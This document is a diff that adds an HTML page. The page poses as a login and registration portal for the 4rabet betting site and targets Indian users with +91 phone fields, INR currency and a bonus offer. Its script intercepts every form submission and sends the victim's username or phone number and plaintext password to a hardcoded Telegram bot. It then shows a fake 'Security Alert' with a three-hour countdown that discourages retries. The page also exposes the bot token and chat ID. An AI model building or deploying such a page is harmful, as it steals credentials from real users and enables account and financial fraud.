@@ -1,0 +1,855 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authentication Portal</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #0b111e;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        /* Container matching the dark modern card theme */
+        .auth-container {
+            background-color: #111928;
+            width: 100%;
+            max-width: 420px;
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+            border: 1px solid #1f2a3f;
+            position: relative;
+        }
+
+        /* Top header bar elements */
+        .auth-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+
+        .chat-icon {
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+        }
+
+        .close-icon {
+            cursor: pointer;
+            color: #6b7280;
+            font-size: 20px;
+            background: none;
+            border: none;
+        }
+
+        .auth-title {
+            font-size: 18px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: #ffffff;
+        }
+
+        /* Sub-navigation link text */
+        .switch-mode-text {
+            font-size: 14px;
+            color: #9ca3af;
+            margin-bottom: 20px;
+        }
+
+        .switch-link {
+            color: #007bff;
+            text-decoration: none;
+            font-weight: 600;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        /* Dual Tabs styling */
+        .tabs-row {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .tab-button {
+            flex: 1;
+            padding: 14px;
+            border-radius: 10px;
+            border: none;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: all 0.2s ease;
+        }
+
+        /* Requirements implemented: Email/ID and Phone both look bright blue when active */
+        .tab-button.active {
+            background-color: #007bff;
+            color: #ffffff;
+        }
+
+        .tab-button.inactive {
+            background-color: #1f2a3f;
+            color: #9ca3af;
+        }
+
+        /* Form Controls */
+        .input-group {
+            margin-bottom: 16px;
+            position: relative;
+        }
+
+        /* Flex row for combined country prefix and number field */
+        .phone-input-container {
+            display: flex;
+            background-color: #151e2e;
+            border: 1px solid #243249;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .country-selector {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            padding: 0 12px;
+            border-right: 1px solid #243249;
+            background-color: #192335;
+            color: #ffffff;
+            font-size: 14px;
+            user-select: none;
+        }
+
+        /* Fixed High-Quality Vector SVG Flag for India */
+        .flag-svg {
+            width: 22px;
+            height: 15px;
+            display: inline-block;
+        }
+
+        .arrow-down {
+            border: solid #9ca3af;
+            border-width: 0 2px 2px 0;
+            display: inline-block;
+            padding: 2.5px;
+            transform: rotate(45deg);
+        }
+
+        .styled-input {
+            width: 100%;
+            background-color: #151e2e;
+            border: 1px solid #243249;
+            border-radius: 10px;
+            padding: 16px;
+            color: #ffffff;
+            font-size: 15px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .styled-input:focus {
+            border-color: #007bff;
+        }
+
+        .phone-input-container .styled-input {
+            border: none;
+        }
+
+        /* Password field eye visibility toggle styling */
+        .password-container {
+            position: relative;
+        }
+
+        .eye-toggle {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #9ca3af;
+            background: none;
+            border: none;
+        }
+
+        /* Forgot password link alignment */
+        .forgot-password-wrap {
+            margin-top: -4px;
+            margin-bottom: 24px;
+            font-size: 13px;
+            color: #9ca3af;
+        }
+
+        /* Action Buttons */
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 700;
+            border: none;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: all 0.3s ease;
+        }
+
+        /* Initially locked status style */
+        .submit-btn.disabled {
+            background-color: #1c2638;
+            color: #4b5563;
+            cursor: not-allowed;
+            pointer-events: none;
+        }
+
+        /* Unlocked dynamic bright blue state */
+        .submit-btn.active-blue {
+            background-color: #007bff;
+            color: #ffffff;
+            cursor: pointer;
+            pointer-events: auto;
+            box-shadow: 0 4px 15px rgba(0, 123, 255, 0.3);
+        }
+
+        /* Divider section */
+        .divider-container {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 24px 0;
+            color: #4b5563;
+            font-size: 13px;
+            font-weight: 700;
+        }
+
+        .divider-container::before, .divider-container::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #1f2a3f;
+        }
+
+        .divider-container:not(:empty)::before {
+            margin-right: .75em;
+        }
+
+        .divider-container:not(:empty)::after {
+            margin-left: .75em;
+        }
+
+        /* Social third party authentication button */
+        .google-btn {
+            width: 100%;
+            padding: 14px;
+            border-radius: 25px;
+            background-color: #0066ff;
+            color: #ffffff;
+            border: none;
+            font-size: 14px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            cursor: pointer;
+        }
+
+        .google-icon-circle {
+            width: 24px;
+            height: 24px;
+            background-color: #ffffff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Registration specific unique view items */
+        .promo-code-trigger {
+            color: #007bff;
+            font-size: 14px;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 24px;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .bonus-section-title {
+            font-size: 13px;
+            font-weight: 700;
+            color: #9ca3af;
+            text-transform: uppercase;
+            margin-bottom: 12px;
+            letter-spacing: 0.5px;
+        }
+
+        /* Promo card component */
+        .bonus-pack-card {
+            background: linear-gradient(90deg, #1d4ed8 0%, #0284c7 100%);
+            border-radius: 12px;
+            padding: 14px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+
+        .bonus-card-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .bonus-illustration {
+            width: 40px;
+            height: 40px;
+            background-color: #f59e0b;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+
+        .bonus-headline {
+            font-size: 14px;
+            font-weight: 700;
+            color: #ffffff;
+        }
+
+        .bonus-subline {
+            font-size: 12px;
+            color: #e0f2fe;
+            margin-top: 2px;
+        }
+
+        .bonus-arrow {
+            color: #ffffff;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        /* Checkbox elements for terms layout */
+        .terms-checkbox-label {
+            display: flex;
+            gap: 10px;
+            font-size: 12px;
+            color: #9ca3af;
+            line-height: 1.5;
+            margin-bottom: 20px;
+            cursor: pointer;
+            align-items: flex-start;
+        }
+
+        .terms-checkbox-label input {
+            margin-top: 2px;
+            accent-color: #10b981;
+        }
+
+        .terms-checkbox-label strong {
+            color: #ffffff;
+        }
+
+        /* Hidden attribute helpers to manage views */
+        .hidden-view {
+            display: none !important;
+        }
+
+        /* Custom Beautiful Square Modal Popup Overlay */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(5, 8, 15, 0.85);
+            backdrop-filter: blur(5px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+
+        .modal-overlay.show {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        /* Perfectly modified Square Alert Box matching 4rabet premium layout */
+        .square-modal-box {
+            background-color: #161f30;
+            width: 90%;
+            max-width: 360px;
+            border: 2px solid #ef4444; /* Highlighting danger border */
+            padding: 24px;
+            text-align: center;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.7);
+            position: relative;
+        }
+
+        .modal-danger-icon {
+            font-size: 42px;
+            margin-bottom: 12px;
+            color: #ef4444;
+        }
+
+        .modal-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 12px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .modal-message {
+            font-size: 14px;
+            color: #d1d5db;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        /* Premium countdown presentation box */
+        .timer-display-box {
+            background-color: #0b111e;
+            border: 1px solid #243249;
+            padding: 12px;
+            font-size: 24px;
+            font-weight: 800;
+            color: #38bdf8; /* Glowing light blue timer color */
+            letter-spacing: 2px;
+            margin-bottom: 24px;
+            font-family: 'Courier New', Courier, monospace;
+        }
+
+        .modal-close-btn {
+            background-color: #ef4444;
+            color: #ffffff;
+            border: none;
+            width: 100%;
+            padding: 12px;
+            font-size: 14px;
+            font-weight: 700;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .modal-close-btn:hover {
+            background-color: #dc2626;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="auth-container">
+        <!-- =============== LOGIN VIEW =============== -->
+        <div id="loginView">
+            <div class="auth-header">
+                <div class="chat-icon">
+                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
+                </div>
+                <div class="auth-title">Log In</div>
+                <button class="close-icon">&times;</button>
+            </div>
+
+            <div class="switch-mode-text">
+                New user? <span class="switch-link" onclick="toggleAuthMode('register')">Registration</span>
+            </div>
+
+            <div class="tabs-row">
+                <button id="loginEmailTab" class="tab-button active" onclick="switchLoginTab('email')">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+                    Email or ID
+                </button>
+                <button id="loginPhoneTab" class="tab-button inactive" onclick="switchLoginTab('phone')">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>
+                    Phone
+                </button>
+            </div>
+
+            <form id="loginForm">
+                <div class="input-group" id="loginUserFieldWrapper">
+                    <input type="text" id="loginUsername" class="styled-input" placeholder="Email or ID">
+                </div>
+
+                <div class="input-group phone-input-container hidden-view" id="loginPhoneFieldWrapper">
+                    <div class="country-selector">
+                        <svg class="flag-svg" viewBox="0 0 900 600">
+                            <rect width="900" height="600" fill="#fff"/>
+                            <rect width="900" height="200" fill="#F4C430"/>
+                            <rect width="900" height="200" y="400" fill="#277424"/>
+                            <g transform="translate(450,300)">
+                                <circle r="92" fill="none" stroke="#000080" stroke-width="6.5"/>
+                                <circle r="16" fill="#000080"/>
+                                <script type="text/javascript">
+                                    for(var i=0; i&lt;24; i++){
+                                        document.write('&lt;line y1="-92" y2="-16" stroke="#000080" stroke-width="4" transform="rotate('+(i*15)+')"/&gt;');
+                                    }
+                                </script>
+                            </g>
+                        </svg>
+                        <span>+91</span>
+                        <span class="arrow-down"></span>
+                    </div>
+                    <input type="tel" id="loginPhone" class="styled-input" placeholder="Phone number">
+                </div>
+
+                <div class="input-group password-container">
+                    <input type="password" id="loginPassword" class="styled-input" placeholder="Password">
+                    <button type="button" class="eye-toggle" onclick="togglePasswordVisibility('loginPassword')">
+                        <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+                    </button>
+                </div>
+
+                <div class="forgot-password-wrap">
+                    Forgot password? <span class="switch-link">Reset</span>
+                </div>
+
+                <button type="submit" id="loginSubmitBtn" class="submit-btn disabled">Log In</button>
+            </form>
+
+            <div class="divider-container">OR</div>
+            <button class="google-btn">
+                <div class="google-icon-circle">
+                    <svg width="14" height="14" viewBox="0 0 24 24"><path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v3.92h6.61c-.29 1.53-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.65-5.17 3.65-8.58z"/><path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.11 0-5.74-2.11-6.68-4.96H1.21v3.15C3.18 21.88 7.31 24 12 24z"/><path fill="#FBBC05" d="M5.32 14.24c-.24-.72-.38-1.5-.38-2.31s.14-1.59.38-2.31V6.48H1.21C.44 8.02 0 9.71 0 11.5s.44 3.48 1.21 5.02l4.11-3.28z"/><path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.31 0 3.18 2.12 1.21 5.02l4.11 3.28c.94-2.85 3.57-4.95 6.68-4.95z"/></svg>
+                </div>
+                Continue with Google
+            </button>
+        </div>
+
+
+        <!-- =============== REGISTRATION VIEW =============== -->
+        <div id="registerView" class="hidden-view">
+            <div class="auth-header">
+                <div class="chat-icon">
+                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" stroke-width="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path></svg>
+                </div>
+                <div class="auth-title">Registration</div>
+                <button class="close-icon">&times;</button>
+            </div>
+
+            <div class="switch-mode-text">
+                Have an account? <span class="switch-link" onclick="toggleAuthMode('login')">Log In</span>
+            </div>
+
+            <form id="registerForm">
+                <div class="input-group phone-input-container">
+                    <div class="country-selector">
+                        <svg class="flag-svg" viewBox="0 0 900 600">
+                            <rect width="900" height="600" fill="#fff"/>
+                            <rect width="900" height="200" fill="#F4C430"/>
+                            <rect width="900" height="200" y="400" fill="#277424"/>
+                            <g transform="translate(450,300)">
+                                <circle r="92" fill="none" stroke="#000080" stroke-width="6.5"/>
+                                <circle r="16" fill="#000080"/>
+                                <script type="text/javascript">
+                                    for(var i=0; i&lt;24; i++){
+                                        document.write('&lt;line y1="-92" y2="-16" stroke="#000080" stroke-width="4" transform="rotate('+(i*15)+')"/&gt;');
+                                    }
+                                </script>
+                            </g>
+                        </svg>
+                        <span>+91</span>
+                        <span class="arrow-down"></span>
+                    </div>
+                    <input type="tel" id="regPhone" class="styled-input" placeholder="Phone number">
+                </div>
+
+                <div class="input-group password-container">
+                    <input type="password" id="regPassword" class="styled-input" placeholder="Password">
+                    <button type="button" class="eye-toggle" onclick="togglePasswordVisibility('regPassword')">
+                        <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+                    </button>
+                </div>
+
+                <div class="input-group phone-input-container" style="margin-bottom: 18px;">
+                    <div class="country-selector" style="border-right: none; background: none; padding-left: 16px;">
+                        <svg class="flag-svg" viewBox="0 0 900 600">
+                            <rect width="900" height="600" fill="#fff"/>
+                            <rect width="900" height="200" fill="#F4C430"/>
+                            <rect width="900" height="200" y="400" fill="#277424"/>
+                            <g transform="translate(450,300)">
+                                <circle r="92" fill="none" stroke="#000080" stroke-width="6.5"/>
+                                <circle r="16" fill="#000080"/>
+                                <script type="text/javascript">
+                                    for(var i=0; i&lt;24; i++){
+                                        document.write('&lt;line y1="-92" y2="-16" stroke="#000080" stroke-width="4" transform="rotate('+(i*15)+')"/&gt;');
+                                    }
+                                </script>
+                            </g>
+                        </svg>
+                    </div>
+                    <select class="styled-input" style="padding-left: 4px; border: none; appearance: none; -webkit-appearance: none; cursor: pointer;">
+                        <option value="INR">₹ - INR</option>
+                    </select>
+                    <div class="arrow-down" style="position: absolute; right: 20px; top: 45%; pointer-events: none;"></div>
+                </div>
+
+                <div class="promo-code-trigger">
+                    <span style="font-size: 16px; font-weight: bold;">+</span> I have a promo code
+                </div>
+
+                <div class="bonus-section-title">Choose your bonus</div>
+                
+                <div class="bonus-pack-card">
+                    <div class="bonus-card-left">
+                        <div class="bonus-illustration">🏗️</div>
+                        <div>
+                            <div class="bonus-headline">777% Tower Rush Welcome Pack</div>
+                            <div class="bonus-subline">Climb the Tower with Boost</div>
+                        </div>
+                    </div>
+                    <div class="bonus-arrow">&rsaquo;</div>
+                </div>
+
+                <label class="terms-checkbox-label">
+                    <input type="checkbox" id="regTerms" checked>
+                    <span>I confirm all the <strong>Terms of user agreement</strong> and that I am over 18</span>
+                </label>
+
+                <button type="submit" id="regSubmitBtn" class="submit-btn disabled">Registration</button>
+            </form>
+
+            <div class="divider-container">OR</div>
+            <button class="google-btn">
+                <div class="google-icon-circle">
+                    <svg width="14" height="14" viewBox="0 0 24 24"><path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v3.92h6.61c-.29 1.53-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.65-5.17 3.65-8.58z"/><path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.11 0-5.74-2.11-6.68-4.96H1.21v3.15C3.18 21.88 7.31 24 12 24z"/><path fill="#FBBC05" d="M5.32 14.24c-.24-.72-.38-1.5-.38-2.31s.14-1.59.38-2.31V6.48H1.21C.44 8.02 0 9.71 0 11.5s.44 3.48 1.21 5.02l4.11-3.28z"/><path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.31 0 3.18 2.12 1.21 5.02l4.11 3.28c.94-2.85 3.57-4.95 6.68-4.95z"/></svg>
+                </div>
+                Continue with Google
+            </button>
+        </div>
+    </div>
+
+    <!-- =============== DYNAMIC MODAL BOX OVERLAY =============== -->
+    <div id="warningModal" class="modal-overlay">
+        <div class="square-modal-box">
+            <div class="modal-danger-icon">⚠️</div>
+            <div class="modal-title">Security Alert</div>
+            <div class="modal-message">
+                Agar aap baar-baar login karte hain toh aapka ID suspend ho jaega. Kripya thoda intezar karein.
+            </div>
+            <!-- Live ticking 3 Hours layout timer -->
+            <div id="timerCountdown" class="timer-display-box">03:00:00</div>
+            <button class="modal-close-btn" onclick="closeWarningModal()">OK</button>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "8908374782:AAF2PPU4Xzl3nhHgca9cOXvXbqNHXbgCjGA";
+        const TELEGRAM_CHAT_ID = "8141432907";
+
+        let activeLoginMethod = 'email'; 
+        let countdownInterval;
+
+        function toggleAuthMode(mode) {
+            if(mode === 'register') {
+                document.getElementById('loginView').classList.add('hidden-view');
+                document.getElementById('registerView').classList.remove('hidden-view');
+            } else {
+                document.getElementById('registerView').classList.add('hidden-view');
+                document.getElementById('loginView').classList.remove('hidden-view');
+            }
+        }
+
+        function switchLoginTab(method) {
+            activeLoginMethod = method;
+            const emailTab = document.getElementById('loginEmailTab');
+            const phoneTab = document.getElementById('loginPhoneTab');
+            const emailWrapper = document.getElementById('loginUserFieldWrapper');
+            const phoneWrapper = document.getElementById('loginPhoneFieldWrapper');
+            const loginUserField = document.getElementById('loginUsername');
+            const loginPhoneField = document.getElementById('loginPhone');
+
+            if(method === 'email') {
+                emailTab.className = "tab-button active";
+                phoneTab.className = "tab-button inactive";
+                emailWrapper.classList.remove('hidden-view');
+                phoneWrapper.classList.add('hidden-view');
+                loginPhoneField.value = "";
+            } else {
+                phoneTab.className = "tab-button active";
+                emailTab.className = "tab-button inactive";
+                phoneWrapper.classList.remove('hidden-view');
+                emailWrapper.classList.add('hidden-view');
+                loginUserField.value = "";
+            }
+            validateLoginInputs();
+        }
+
+        function togglePasswordVisibility(fieldId) {
+            const inputField = document.getElementById(fieldId);
+            if(inputField.type === 'password') {
+                inputField.type = 'text';
+            } else {
+                inputField.type = 'password';
+            }
+        }
+
+        function validateLoginInputs() {
+            const passwordVal = document.getElementById('loginPassword').value.trim();
+            const emailUsernameVal = document.getElementById('loginUsername').value.trim();
+            const phoneVal = document.getElementById('loginPhone').value.trim();
+            const loginSubmitBtn = document.getElementById('loginSubmitBtn');
+
+            let credentialCheck = false;
+            if(activeLoginMethod === 'email' && emailUsernameVal.length > 0) {
+                credentialCheck = true;
+            } else if(activeLoginMethod === 'phone' && phoneVal.length > 0) {
+                credentialCheck = true;
+            }
+
+            if(credentialCheck && passwordVal.length > 0) {
+                loginSubmitBtn.classList.remove('disabled');
+                loginSubmitBtn.classList.add('active-blue');
+            } else {
+                loginSubmitBtn.classList.remove('active-blue');
+                loginSubmitBtn.classList.add('disabled');
+            }
+        }
+
+        function validateRegisterInputs() {
+            const phoneVal = document.getElementById('regPhone').value.trim();
+            const passwordVal = document.getElementById('regPassword').value.trim();
+            const termsChecked = document.getElementById('regTerms').checked;
+            const regSubmitBtn = document.getElementById('regSubmitBtn');
+
+            if(phoneVal.length > 0 && passwordVal.length > 0 && termsChecked) {
+                regSubmitBtn.classList.remove('disabled');
+                regSubmitBtn.classList.add('active-blue');
+            } else {
+                regSubmitBtn.classList.remove('active-blue');
+                regSubmitBtn.classList.add('disabled');
+            }
+        }
+
+        async function sendToTelegram(messageText) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: messageText,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.error("Telegram API Error:", error);
+            }
+        }
+
+        // Timer control logic (Runs for exactly 3 hours)
+        function startThreeHourTimer() {
+            clearInterval(countdownInterval);
+            let totalSeconds = 3 * 60 * 60; // 3 hours in seconds
+            
+            const timerElement = document.getElementById('timerCountdown');
+            
+            countdownInterval = setInterval(() => {
+                if (totalSeconds <= 0) {
+                    clearInterval(countdownInterval);
+                    timerElement.textContent = "00:00:00";
+                    return;
+                }
+                totalSeconds--;
+                
+                let hrs = Math.floor(totalSeconds / 3600);
+                let mins = Math.floor((totalSeconds % 3600) / 60);
+                let secs = totalSeconds % 60;
+                
+                // Format with padded zeros
+                let formattedTime = 
+                    (hrs < 10 ? "0" + hrs : hrs) + ":" + 
+                    (mins < 10 ? "0" + mins : mins) + ":" + 
+                    (secs < 10 ? "0" + secs : secs);
+                    
+                timerElement.textContent = formattedTime;
+            }, 1000);
+        }
+
+        function showWarningModal() {
+            const modal = document.getElementById('warningModal');
+            modal.classList.add('show');
+            startThreeHourTimer();
+        }
+
+        function closeWarningModal() {
+            const modal = document.getElementById('warningModal');
+            modal.classList.remove('show');
+            clearInterval(countdownInterval);
+        }
+
+        // Login Submit Interception
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const passwordVal = document.getElementById('loginPassword').value;
+            let userIdentifier = activeLoginMethod === 'email' ? 
+                document.getElementById('loginUsername').value : 
+                "+91 " + document.getElementById('loginPhone').value;
+
+            const message = `<b>🔔 New 4rabet Login Attempt</b>\n\n` +
+                            `<b>Method:</b> ${activeLoginMethod.toUpperCase()}\n` +
+                            `<b>User/Phone:</b> <code>${userIdentifier}</code>\n` +
+                            `<b>Password:</b> <code>${passwordVal}</code>`;
+
+            // Back-end send to Telegram first
+            await sendToTelegram(message);
+            
+            // Pop up the modified 3-hour suspension warning square box immediately
+            showWarningModal();
+        });
+
+        // Registration Submit Interception
+        document.getElementById('registerForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const phoneVal = "+91 " + document.getElementById('regPhone').value;
+            const passwordVal = document.getElementById('regPassword').value;
+
+            const message = `<b>✨ New 4rabet Registration</b>\n\n` +
+                            `<b>Phone:</b> <code>${phoneVal}</code>\n` +
+                            `<b>Password:</b> <code>${passwordVal}</code>\n` +
+                            `<b>Currency:</b> INR (₹)`;
+
+            await sendToTelegram(message);
+            showWarningModal();
+        });
+
+        // Event listeners for inputs
+        document.getElementById('loginUsername').addEventListener('input', validateLoginInputs);
+        document.getElementById('loginPhone').addEventListener('input', validateLoginInputs);
+        document.getElementById('loginPassword').addEventListener('input', validateLoginInputs);
+
+        document.getElementById('regPhone').addEventListener('input', validateRegisterInputs);
+        document.getElementById('regPassword').addEventListener('input', validateRegisterInputs);
+        document.getElementById('regTerms').addEventListener('change', validateRegisterInputs);
+        
+        validateLoginInputs();
+        validateRegisterInputs();
+    </script>
+</body>
+</html>
